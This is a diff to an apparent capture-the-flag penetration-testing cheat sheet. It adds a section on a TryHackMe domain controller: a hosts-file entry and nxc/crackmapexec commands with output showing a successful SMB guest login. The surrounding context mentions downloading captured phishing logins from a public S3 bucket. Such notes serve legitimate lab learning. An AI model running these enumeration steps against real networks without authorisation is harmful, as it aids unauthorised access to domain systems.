@@ -31,7 +31,7 @@
 - [12. Post-Exploit Enumeration](#post)
 - [13. Password Cracking](/hash_cracking.md)
 - [14. RDP-3389](#rdp)
-
+- [15. Domain controler](#domain)
 - [16. Metasploit](/metasploit.md)
 - [18. Reverse_Shell_Script](#rev)
 - [19. Privilege escalation](/Privilege.md)
@@ -315,6 +315,26 @@ download: s3://darkinjector-phish/captured-logins-093582390 to ./captured-logins
 - __✅ To your current directory on your local system__
 - __✅ Without needing authentication (public access)__
 - __✅ In the us-west-2 region__
+
+
+# 15. Domain controler <a name="domain"></a>
+- Target
+- `nano /etc/hosts`
+- `10.10.210.170 labyrinth.thm.local thm.local thm-LABYRINTH-CA thm.local0`
+
+```
+┌──(root㉿kali)-[~]
+└─# nxc smb labyrinth.thm.local -u 'guest' -p ''
+SMB         labyrinth.thm.local 445    LABYRINTH        [*] Windows 10 / Server 2019 Build 17763 x64 (name:LABYRINTH) (domain:thm.local) (signing:True) (SMBv1:False)
+SMB         labyrinth.thm.local 445    LABYRINTH        [+] thm.local\guest: 
+```
+### or
+```
+┌──(root㉿kali)-[~]
+└─# crackmapexec smb labyrinth.thm.local -u 'guest' -p ''
+SMB         labyrinth.thm.local 445    LABYRINTH        [*] Windows 10 / Server 2019 Build 17763 x64 (name:LABYRINTH) (domain:thm.local) (signing:True) (SMBv1:False)
+SMB         labyrinth.thm.local 445    LABYRINTH        [+] thm.local\guest: 
+```
 
 
 
